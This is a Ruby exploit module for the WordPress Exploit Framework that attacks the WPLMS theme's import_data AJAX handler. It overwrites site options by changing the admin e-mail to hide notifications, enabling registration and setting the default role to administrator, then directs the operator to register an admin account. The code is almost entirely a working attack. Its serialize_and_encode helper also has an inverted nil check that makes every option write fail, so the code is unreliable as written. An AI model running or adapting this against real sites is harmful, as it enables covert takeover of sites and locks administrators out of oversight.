# frozen_string_literal: true

require 'base64'

class Wpxf::Auxiliary::WplmsPrivilegeEscalation < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient
  include Wpxf::WordPress::Login

  def initialize
    super

    update_info(
      name: 'WPLMS Theme Privilege Escalation',
      desc: %(
        The WordPress WPLMS theme from version 1.5.2 to 1.8.4.1 allows
        an authenticated user of any user level to set any system option
        due to a lack of validation in the import_data function of
        /includes/func.php.

        The module first changes the admin e-mail address to prevent any
        notifications being sent to the actual administrator during the
        attack, re-enables user registration in case it has been
        disabled and sets the default role to be administrator.
        This will allow for the user to create a new account with admin
        privileges via the default registration page found at
        /wp-login.php?action=register.
      ),
      desc_preformatted: true,
      author: [
        'Evex',     # Vulnerability discovery
        'rastating' # WPXF module
      ],
      references: [
        ['WPVDB', '7785']
      ],
      date: 'Feb 09 2015'
    )
  end

  def check
    check_theme_version_from_readme('wplms', '1.8.4.2', '1.5.2')
  end

  def requires_authentication
    true
  end

  def php_serialize(value)
    # Only strings and numbers are required by this module
    case value
    when String, Symbol
      "s:#{value.bytesize}:\"#{value}\";"
    when Integer
      "i:#{value};"
    end
  end

  def serialize_and_encode(value)
    serialized_value = php_serialize(value)
    return nil unless serialized_value.nil?

    Base64.strict_encode64(serialized_value)
  end

  def set_wp_option(name, value)
    encoded_value = serialize_and_encode(value)
    if encoded_value.nil?
      emit_error "Failed to serialize #{value}", true
      return nil
    end

    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      params: { 'action' => 'import_data' },
      body: { 'name' => name, 'code' => encoded_value },
      cookie: session_cookie
    )

    if res.nil?
      emit_error 'No response from the target', true
    elsif res.code != 200
      emit_warning "Server responded with code #{res.code}", true
    end

    res
  end

  def run
    return false unless super

    new_email = "#{Utility::Text.rand_alpha(5)}@#{Utility::Text.rand_alpha(5)}.com"
    emit_info "Changing admin e-mail address to #{new_email}..."
    if set_wp_option('admin_email', new_email).nil?
      emit_error 'Failed to change the admin e-mail address'
      return false
    end

    emit_info 'Enabling user registrations...'
    if set_wp_option('users_can_register', 1).nil?
      emit_error 'Failed to enable user registrations'
      return false
    end

    emit_info 'Setting the default user role...'
    if set_wp_option('default_role', 'administrator').nil?
      emit_error 'Failed to set the default user role'
      return false
    end

    register_url = normalize_uri(full_uri, 'wp-login.php?action=register')
    emit_success 'Privilege escalation complete'
    emit_success "Create a new account at #{register_url} to gain admin access."

    true
  end
end
